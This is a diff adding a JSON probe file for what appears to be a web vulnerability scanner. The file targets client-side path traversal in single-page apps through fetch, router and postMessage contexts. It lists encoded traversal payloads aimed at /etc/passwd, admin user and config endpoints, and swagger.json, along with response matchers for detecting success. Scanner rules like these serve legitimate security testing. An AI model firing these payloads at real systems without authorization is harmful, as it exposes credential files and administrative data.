@@ -1,0 +1,83 @@
+{
+  "category": "client_side_path_traversal",
+  "contexts": {
+    "fetch_path_injection": {
+      "description": "Client-side path traversal via fetch/XHR -- manipulate URL path segments that client-side code uses to construct API requests",
+      "tech_match": ["React", "Angular", "Vue", "Next.js", "Nuxt", "SvelteKit"],
+      "param_match": ["id", "slug", "path", "page", "name", "file", "resource", "type", "category", "ref"],
+      "probes": [
+        {
+          "payload": "..%2f..%2fapi/admin/users",
+          "description": "URL-encoded path traversal in API fetch -- client-side code appends user input to API base URL, traversal reaches different endpoint",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 100},
+            {"type": "not_word", "words": ["not found", "invalid"]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "..%2f..%2f..%2fetc/passwd",
+          "description": "Deep path traversal via client-side fetch -- triple traversal to reach unintended server paths",
+          "matchers": [
+            {"type": "word", "words": ["root:", "/bin/"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "%2e%2e%2f%2e%2e%2fadmin",
+          "description": "Double-encoded dot-dot-slash -- bypass client-side path validation that checks for literal ../",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 50},
+            {"type": "not_word", "words": ["not found", "bad request"]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40
+        }
+      ]
+    },
+    "router_manipulation": {
+      "description": "Client-side router manipulation -- abuse SPA routing to force client to load attacker-controlled state or fetch different API responses",
+      "tech_match": ["React", "Angular", "Vue", "Next.js", "Nuxt"],
+      "param_match": ["path", "route", "page", "view", "tab", "section", "redirect", "next", "return"],
+      "probes": [
+        {
+          "payload": "/api/v1/../../admin/config",
+          "description": "Router path traversal -- SPA router passes path to API client which constructs fetch URL with traversal",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 100},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "{{baseline}}/../../../swagger.json",
+          "description": "Traversal to API documentation -- access Swagger/OpenAPI spec via path traversal in client routing",
+          "matchers": [
+            {"type": "word", "words": ["swagger", "openapi", "paths", "components"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "postmessage_cspt": {
+      "description": "CSPT via postMessage -- attacker page sends crafted path via postMessage, victim page uses it in fetch/XHR",
+      "tech_match": ["React", "Angular", "Vue"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Check for postMessage listeners that use message data in URL construction -- look for addEventListener('message') handlers fetching dynamic URLs",
+          "matchers": [
+            {"type": "word", "words": ["addEventListener", "postMessage", "message"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 25
+        }
+      ]
+    }
+  }
+}
